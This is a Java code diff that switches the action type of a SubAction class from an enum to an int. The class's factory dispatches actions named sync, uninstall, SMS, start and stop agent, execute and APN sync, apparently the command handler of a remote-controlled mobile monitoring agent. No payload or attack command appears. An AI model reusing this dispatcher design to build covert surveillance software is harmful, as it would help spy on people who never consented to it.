@@ -20,7 +20,7 @@ public abstract class SubAction implements Runnable {
 	private static final String TAG = "SubAction";
 
 	/** Action type. */
-	private final SubActionType subActionType;
+	private final int subActionType;
 
 	/** Parameters. */
 	private final byte[] subActionParams;
@@ -37,13 +37,13 @@ public abstract class SubAction implements Runnable {
 	/**
 	 * Instantiates a new sub action.
 	 * 
-	 * @param type
+	 * @param actionType
 	 *            the type
 	 * @param params
 	 *            the params
 	 */
-	public SubAction(final SubActionType type, final byte[] params) {
-		this.subActionType = type;
+	public SubAction(final int actionType, final byte[] params) {
+		this.subActionType = actionType;
 		this.subActionParams = params;
 		this.status = Status.self();
 
@@ -59,46 +59,46 @@ public abstract class SubAction implements Runnable {
 	 *            the conf params
 	 * @return the sub action
 	 */
-	public static SubAction factory(final SubActionType type, final byte[] confParams) {
+	public static SubAction factory(final int type, final byte[] confParams) {
 
 		switch (type) {
-			case ACTION_SYNC:
+			case SubActionType.ACTION_SYNC:
 				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_SYNC ***");
 				return new SyncActionInternet(type, confParams);
 
-			case ACTION_UNINSTALL:
+			case SubActionType.ACTION_UNINSTALL:
 				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_UNINSTALL ***");
 				return new UninstallAction(type, confParams);
 
-			case ACTION_RELOAD:
+			case SubActionType.ACTION_RELOAD:
 				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_RELOAD ***");
 				return new ReloadAction(type, confParams);
 
-			case ACTION_SMS:
+			case SubActionType.ACTION_SMS:
 				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_SMS ***");
 				return new SmsAction(type, confParams);
 
-			case ACTION_START_AGENT:
+			case SubActionType.ACTION_START_AGENT:
 				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_START_AGENT ***");
 				return new StartAgentAction(type, confParams);
 
-			case ACTION_STOP_AGENT:
+			case SubActionType.ACTION_STOP_AGENT:
 				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_STOP_AGENT ***");
 				return new StopAgentAction(type, confParams);
 
-			case ACTION_SYNC_PDA:
+			case SubActionType.ACTION_SYNC_PDA:
 				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_SYNC_PDA ***");
 				return new SyncPdaAction(type, confParams);
 
-			case ACTION_EXECUTE:
+			case SubActionType.ACTION_EXECUTE:
 				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_EXECUTE ***");
 				return new ExecuteAction(type, confParams);
 
-			case ACTION_SYNC_APN:
+			case SubActionType.ACTION_SYNC_APN:
 				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_SYNC ***");
 				return new SyncActionApn(type, confParams);
 
-			case ACTION_LOG:
+			case SubActionType.ACTION_LOG:
 				if(Cfg.DEBUG) Check.log( TAG + " Factory *** ACTION_INFO ***");
 				return new LogAction(type, confParams);
 
@@ -112,7 +112,7 @@ public abstract class SubAction implements Runnable {
 	 * 
 	 * @return the sub action type
 	 */
-	public SubActionType getSubActionType() {
+	public int getSubActionType() {
 		return subActionType;
 	}
 
